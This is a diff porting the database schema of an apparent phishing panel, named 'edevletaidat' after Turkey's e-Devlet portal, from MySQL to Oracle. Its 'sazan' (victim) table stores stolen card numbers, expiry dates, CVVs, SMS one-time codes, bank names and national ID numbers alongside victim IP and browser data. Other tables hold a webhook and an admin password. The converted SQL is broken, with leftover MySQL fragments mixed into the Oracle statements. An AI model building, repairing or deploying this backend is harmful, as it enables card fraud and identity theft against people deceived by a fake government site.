@@ -1,215 +1,193 @@
--- phpMyAdmin SQL Dump
--- version 5.2.0
--- https://www.phpmyadmin.net/
---
--- Anamakine: 127.0.0.1
--- Üretim Zamanı: 02 Mar 2023, 17:53:53
--- Sunucu sürümü: 10.4.27-MariaDB
--- PHP Sürümü: 8.2.0
+-- =====================================================
+-- E-DEVLET AİDAT SİSTEMİ - VERİTABANI KURULUM
+-- =====================================================
+-- Oracle SQL'de çalıştırın
+-- sqlplus username/password@database @edevletaidat.sql
+-- =====================================================
+-- Güncelleme: 15 Kasım 2025
+-- =====================================================
 
-SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
-START TRANSACTION;
-SET time_zone = "+00:00";
-
-
-/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
-/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
-/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
-/*!40101 SET NAMES utf8mb4 */;
-
---
--- Veritabanı: `edevletaidat`
---
+-- Not: Bu dosya MySQL için yazılmıştır. Oracle SQL'e dönüştürülmesi gerekiyor.
+-- Oracle'da veritabanı yerine tablespace ve schema kullanılır.
 
 -- --------------------------------------------------------
 
 --
--- Tablo için tablo yapısı `back`
+-- Tablo için tablo yapısı back
 --
 
-CREATE TABLE `back` (
-  `back` varchar(255) NOT NULL
-) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;
+CREATE TABLE back (
+  id NUMBER GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
+  back VARCHAR2(255) NOT NULL
+);
+
+CREATE INDEX idx_back ON back(back);
 
 -- --------------------------------------------------------
-
 --
--- Tablo için tablo yapısı `ban`
---
-
-CREATE TABLE `ban` (
-  `ban` varchar(255) NOT NULL,
-  `ulke` text NOT NULL,
-  `date` text NOT NULL,
-  `cihaz` varchar(255) NOT NULL,
-  `tarayici` varchar(255) NOT NULL
-) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;
-
--- --------------------------------------------------------
-
---
--- Tablo için tablo yapısı `hata1`
+-- Tablo için tablo yapısı ban
 --
 
-CREATE TABLE `hata1` (
-  `hata1` varchar(255) NOT NULL
+CREATE TABLE ban (
+  id NUMBER GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
+  ban VARCHAR2(255) NOT NULL,
+  ulke CLOB NOT NULL,
+  date_val VARCHAR2(255) NOT NULL,
+  cihaz VARCHAR2(255) NOT NULL,
+  tarayici VARCHAR2(255) NOT NULL
+);
+
+CREATE INDEX idx_ban ON ban(ban);
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_turkish_ci;
+
+--
+-- Tablo için tablo yapısı hata1
+--
+
+CREATE TABLE hata1 (
+  id NUMBER GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
+  hata1 VARCHAR2(255) NOT NULL
+);
+
+CREATE INDEX idx_hata1 ON hata1(hata1);
+  INDEX `idx_hata1` (`hata1`)
 ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
-
--- --------------------------------------------------------
-
 --
--- Tablo için tablo yapısı `hata2`
+-- Tablo için tablo yapısı hata2
 --
 
-CREATE TABLE `hata2` (
-  `hata2` varchar(255) NOT NULL
-) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
+CREATE TABLE hata2 (
+  id NUMBER GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
+  hata2 VARCHAR2(255) NOT NULL
+);
 
--- --------------------------------------------------------
-
+CREATE INDEX idx_hata2 ON hata2(hata2);
+  `hata2` varchar(255) NOT NULL,
+  INDEX `idx_hata2` (`hata2`)
 --
--- Tablo için tablo yapısı `hata3`
---
-
-CREATE TABLE `hata3` (
-  `hata3` varchar(255) NOT NULL
-) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
-
--- --------------------------------------------------------
-
---
--- Tablo için tablo yapısı `ips`
+-- Tablo için tablo yapısı hata3
 --
 
-CREATE TABLE `ips` (
-  `id` bigint(20) NOT NULL,
+CREATE TABLE hata3 (
+  id NUMBER GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
+  hata3 VARCHAR2(255) NOT NULL
+);
+
+CREATE INDEX idx_hata3 ON hata3(hata3);
+  `id` INT AUTO_INCREMENT PRIMARY KEY,
+  `hata3` varchar(255) NOT NULL,
+--
+-- Tablo için tablo yapısı ips
+--
+
+CREATE TABLE ips (
+  id NUMBER GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
+  ipAddress VARCHAR2(255) NOT NULL UNIQUE,
+  lastOnline NUMBER NOT NULL
+);
+
+CREATE INDEX idx_lastOnline ON ips(lastOnline);
   `ipAddress` varchar(255) NOT NULL,
-  `lastOnline` bigint(255) NOT NULL
-) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;
-
--- --------------------------------------------------------
-
+  `lastOnline` bigint(255) NOT NULL,
+  UNIQUE KEY `ipAddress` (`ipAddress`),
 --
--- Tablo için tablo yapısı `paneldekiler`
+-- Tablo için tablo yapısı paneldekiler
 --
 
-CREATE TABLE `paneldekiler` (
+CREATE TABLE paneldekiler (
+  id NUMBER GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
+  ip CLOB NOT NULL,
+  tarih CLOB NOT NULL,
+  tarayici VARCHAR2(255) NOT NULL,
+  durum CLOB NOT NULL
+);
   `ip` text NOT NULL,
   `tarih` text NOT NULL,
   `tarayici` varchar(255) NOT NULL,
-  `durum` text NOT NULL
-) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
-
--- --------------------------------------------------------
-
 --
--- Tablo için tablo yapısı `sazan`
+-- Tablo için tablo yapısı sazan
 --
 
-CREATE TABLE `sazan` (
-  `id` int(11) NOT NULL,
-  `date` varchar(255) NOT NULL,
-  `kk` varchar(255) DEFAULT NULL,
-  `sonkul` varchar(255) DEFAULT NULL,
-  `cvv` varchar(255) DEFAULT NULL,
-  `kartlimit` int(11) NOT NULL,
-  `sms` varchar(255) DEFAULT NULL,
-  `now` varchar(255) NOT NULL DEFAULT 'Anasayfa',
-  `back` int(11) NOT NULL DEFAULT 0,
-  `ip` varchar(255) NOT NULL,
-  `lastOnline` bigint(20) DEFAULT NULL,
-  `banka` varchar(255) DEFAULT NULL,
-  `tc` varchar(255) NOT NULL,
+CREATE TABLE sazan (
+  id NUMBER GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
+  date_val VARCHAR2(255) NOT NULL,
+  kk VARCHAR2(255) DEFAULT NULL,
+  sonkul VARCHAR2(255) DEFAULT NULL,
+  cvv VARCHAR2(255) DEFAULT NULL,
+  kartlimit VARCHAR2(50) DEFAULT NULL,
+  sms VARCHAR2(255) DEFAULT NULL,
+  now VARCHAR2(255) DEFAULT 'Anasayfa' NOT NULL,
+  back NUMBER DEFAULT 0 NOT NULL,
+  ip VARCHAR2(255) NOT NULL,
+  lastOnline NUMBER DEFAULT NULL,
+  banka VARCHAR2(255) DEFAULT NULL,
+  tc VARCHAR2(255) NOT NULL,
+  cihaz VARCHAR2(255) NOT NULL,
+  tarayici VARCHAR2(255) NOT NULL
+);
+
+CREATE INDEX idx_ip ON sazan(ip);
+CREATE INDEX idx_now ON sazan(now);
   `cihaz` varchar(255) NOT NULL,
-  `tarayici` varchar(255) NOT NULL
-) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_turkish_ci;
-
--- --------------------------------------------------------
-
+  `tarayici` varchar(255) NOT NULL,
 --
--- Tablo için tablo yapısı `site`
+-- Tablo için tablo yapısı site
 --
 
-CREATE TABLE `site` (
-  `id` int(11) NOT NULL,
-  `pass` text NOT NULL,
-  `kart_sesi` int(11) NOT NULL DEFAULT 0,
-  `sms_sesi` int(11) NOT NULL DEFAULT 0,
-  `webhook` int(11) NOT NULL,
-  `webhookURL` varchar(255) NOT NULL,
-  `tutar` varchar(255) NOT NULL
-) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;
+CREATE TABLE site (
+  id NUMBER GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
+  pass CLOB NOT NULL,
+  kart_sesi NUMBER DEFAULT 0 NOT NULL,
+  sms_sesi NUMBER DEFAULT 0 NOT NULL,
+  webhook NUMBER DEFAULT 0 NOT NULL,
+  webhookURL VARCHAR2(255) NOT NULL,
+  tutar VARCHAR2(255) NOT NULL
+);
 
+--
+-- Tablo döküm verisi site
+--
+
+INSERT INTO site (pass, kart_sesi, sms_sesi, webhook, webhookURL, tutar) VALUES
+('admin123', 0, 0, 0, '.', '150');
 --
 -- Tablo döküm verisi `site`
 --
-
-INSERT INTO `site` (`id`, `pass`, `kart_sesi`, `sms_sesi`, `webhook`, `webhookURL`, `tutar`) VALUES
-(1, 'lenard', 0, 0, 0, '.', '150');
-
--- --------------------------------------------------------
-
 --
--- Tablo için tablo yapısı `sms`
+-- Tablo için tablo yapısı sms
 --
+
+CREATE TABLE sms (
+  id NUMBER GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
+  sms VARCHAR2(255) NOT NULL
+);
+
+CREATE INDEX idx_sms ON sms(sms);
 
 CREATE TABLE `sms` (
-  `sms` varchar(255) NOT NULL
-) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;
-
--- --------------------------------------------------------
-
 --
--- Tablo için tablo yapısı `tebrik`
+-- Tablo için tablo yapısı tebrik
+--
+
+CREATE TABLE tebrik (
+  id NUMBER GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
+  tebrik VARCHAR2(255) NOT NULL
+);
+
+CREATE INDEX idx_tebrik ON tebrik(tebrik);
 --
 
 CREATE TABLE `tebrik` (
-  `tebrik` varchar(255) NOT NULL
-) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;
+  `id` INT AUTO_INCREMENT PRIMARY KEY,
+  `tebrik` varchar(255) NOT NULL,
+  INDEX `idx_tebrik` (`tebrik`)
+) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;
 
---
--- Dökümü yapılmış tablolar için indeksler
---
+-- =====================================================
+COMMIT;
+-- Admin Panel Şifre: admin123 (değiştirin!)
+-- =====================================================
 
---
--- Tablo için indeksler `ips`
---
-ALTER TABLE `ips`
-  ADD PRIMARY KEY (`id`);
-
---
--- Tablo için indeksler `sazan`
---
-ALTER TABLE `sazan`
-  ADD PRIMARY KEY (`id`);
-
---
--- Tablo için indeksler `site`
---
-ALTER TABLE `site`
-  ADD PRIMARY KEY (`id`);
-
---
--- Dökümü yapılmış tablolar için AUTO_INCREMENT değeri
---
-
---
--- Tablo için AUTO_INCREMENT değeri `ips`
---
-ALTER TABLE `ips`
-  MODIFY `id` bigint(20) NOT NULL AUTO_INCREMENT;
-
---
--- Tablo için AUTO_INCREMENT değeri `sazan`
---
-ALTER TABLE `sazan`
-  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=4;
-
---
--- Tablo için AUTO_INCREMENT değeri `site`
---
-ALTER TABLE `site`
-  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;
 COMMIT;
 
 /*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
